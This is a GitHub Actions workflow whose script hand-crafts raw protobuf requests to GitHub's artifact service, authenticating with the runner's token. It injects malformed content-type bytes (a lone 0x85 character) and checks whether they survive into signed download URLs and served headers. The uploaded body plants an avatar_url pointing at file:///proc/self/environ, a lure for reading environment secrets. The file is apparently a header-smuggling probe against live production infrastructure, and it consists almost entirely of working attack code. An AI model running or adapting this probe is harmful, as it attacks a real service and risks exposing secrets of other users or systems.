name: rc-matrix2
on:
  workflow_dispatch:
permissions:
  actions: write
  contents: read
jobs:
  matrix:
    runs-on: ubuntu-latest
    steps:
      - name: deps
        run: npm install --no-save --no-audit --no-fund @actions/artifact@6.3.1
      - name: raw-byte protobuf probe
        uses: actions/github-script@v7
        env:
          GITHUB_TOKEN: ${{ github.token }}
        with:
          script: |
            const {createHash} = await import('node:crypto');
            const https = (await import('node:https')).default;
            const WS = process.env.GITHUB_WORKSPACE || process.cwd();
            const {internalArtifactTwirpClient} = await import(`${WS}/node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js`);
            const {getBackendIdsFromToken} = await import(`${WS}/node_modules/@actions/artifact/lib/internal/shared/util.js`);
            const {StringValue} = await import(`${WS}/node_modules/@actions/artifact/lib/generated/index.js`);
            const ids = getBackendIdsFromToken();
            const client = internalArtifactTwirpClient({maxAttempts: 1});
            const repo = process.env.GITHUB_REPOSITORY, stamp = process.env.GITHUB_RUN_ID;
            const sha = b => createHash('sha256').update(b).digest('hex');
            const BODY = Buffer.from('{"full_name":"x","owner":{"login":"c","avatar_url":"file:///proc/self/environ"}}','utf8');
            const BLOBCT = Buffer.concat([Buffer.from('application/json','latin1'), Buffer.from([0x85])]).toString('latin1');

            const req = (url, method='GET', body=null, headers={}) => new Promise((res, rej) => {
              const u = new URL(url);
              const r = https.request(u, {method, headers, timeout: 30000}, resp => {
                const c=[]; resp.on('data',d=>c.push(d));
                resp.on('end',()=>res({status:resp.statusCode, headers:resp.headers, raw:resp.rawHeaders, body:Buffer.concat(c)}));
              });
              r.on('error',rej); r.on('timeout',()=>r.destroy(new Error('timeout')));
              if (body) r.write(body); r.end();
            });
            const ctHex = r => { const o=[]; for(let i=0;i<r.raw.length;i+=2) if(r.raw[i].toLowerCase()==='content-type') o.push(Buffer.from(r.raw[i+1],'latin1').toString('hex')); return o; };

            // --- minimal protobuf writer ---
            const varint = n => { const o=[]; while(n>127){o.push((n&127)|128); n>>>=7;} o.push(n); return Buffer.from(o); };
            const tag = (f,w) => varint((f<<3)|w);
            const ld = (f, buf) => Buffer.concat([tag(f,2), varint(buf.length), buf]);
            const vi = (f, n) => Buffer.concat([tag(f,0), varint(n)]);
            // CreateArtifactRequest{1:run,2:job,3:name,5:version,6:StringValue{1:value}}
            function encCreate({runId, jobId, name, version, mimeBytes}) {
              return Buffer.concat([
                ld(1, Buffer.from(runId,'utf8')),
                ld(2, Buffer.from(jobId,'utf8')),
                ld(3, Buffer.from(name,'utf8')),
                vi(5, version),
                ld(6, ld(1, mimeBytes)),
              ]);
            }

            async function createRaw(label, version, mimeBuf) {
              const name = `rcraw-${label}-${stamp}`.replace(/[^A-Za-z0-9._-]/g,'-');
              const out = {label, version, mimeHex: mimeBuf.toString('hex')};
              const bytes = encCreate({runId: ids.workflowRunBackendId, jobId: ids.workflowJobRunBackendId, name, version, mimeBytes: mimeBuf});
              const url = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL).href;
              const r = await req(url, 'POST', bytes, {
                'Authorization': `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
                'Content-Type': 'application/protobuf',
                'Content-Length': String(bytes.length),
              });
              out.createStatus = r.status;
              out.createBody = r.body.toString('utf8').slice(0,200);
              if (r.status !== 200) { console.log('RCR '+JSON.stringify(out)); return; }
              // get upload URL via JSON client (by name)
              let up;
              try { up = (await client.GetSignedArtifactURL({...ids, name})).signedUrl; } catch(e){ out.signedErr = String(e.message||e).slice(0,140); }
              if (up) {
                out.put = (await req(up,'PUT',BODY,{'x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':BLOBCT,'Content-Length':String(BODY.length)})).status;
                try { const f = await client.FinalizeArtifact({...ids, name, size:String(BODY.length), hash:StringValue.create({value:`sha256:${sha(BODY)}`})}); out.finId = String(f.artifactId||''); } catch(e){ out.finErr = String(e.message||e).slice(0,140); }
                const m = /[?&]rsct=([^&]*)/.exec(up); out.rsctRaw = m?m[1]:null;
                if (out.finId) {
                  const api = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${out.finId}/zip`,'GET',null,{Authorization:`Bearer ${process.env.GITHUB_TOKEN}`,Accept:'application/vnd.github.v3+json','User-Agent':'rc'});
                  if (api.status===302 && api.headers.location) {
                    const lm=/[?&]rsct=([^&]*)/.exec(api.headers.location); out.zipRsctRaw = lm?lm[1]:null;
                    out.zipRsctDecodedHex = lm?Buffer.from(decodeURIComponent(lm[1]),'latin1').toString('hex'):null;
                    const fr = await req(new URL(api.headers.location).href);
                    out.servedCtHex = ctHex(fr); out.bodyMatch = fr.body.equals(BODY);
                  } else out.zipStatus = api.status;
                }
              }
              console.log('RCR '+JSON.stringify(out));
            }

            const LONE = Buffer.from([0x85]);
            await createRaw('tail85', 7, Buffer.concat([Buffer.from('application/json','latin1'), LONE]));
            await createRaw('lead85', 7, Buffer.concat([LONE, Buffer.from('application/json','latin1')]));
            await createRaw('c285',   7, Buffer.from('application/json\u0085','utf8'));  // control: 2-byte UTF-8
            await createRaw('ctl',    7, Buffer.from('application/json','latin1'));
            await createRaw('v6tail', 6, Buffer.concat([Buffer.from('application/json','latin1'), LONE]));
            console.log('RCR DONE');
